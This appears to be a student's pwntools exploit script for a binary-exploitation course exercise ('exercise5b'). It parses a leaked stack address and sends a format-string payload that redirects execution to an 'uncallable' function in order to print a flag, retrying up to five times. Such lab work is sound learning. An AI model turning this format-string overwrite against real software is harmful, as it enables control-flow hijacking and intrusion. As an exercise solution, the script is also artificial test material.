#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise5/exercise5b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================



# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

for _ in range(5):      # with small probability, it might not find the flag, thus to increase prob repeat exploit
    try:
        r = start()
        offset = 10
        uncallable_address = 4198983

        output = r.recvline(keepends=False)
        print(output)

        address = output.decode().split(' ')[-1]
        address = int(address, base=0)
        print(address)

        writes = {(address + offset - 6): uncallable_address}
        r.sendline(fmtstr_payload(offset, writes, write_size='byte'))

        r.recvline(keepends=False)
        flag_output = r.recvall(timeout=2)
        print(flag_output.decode(errors='ignore'))
        
    except:
        pass
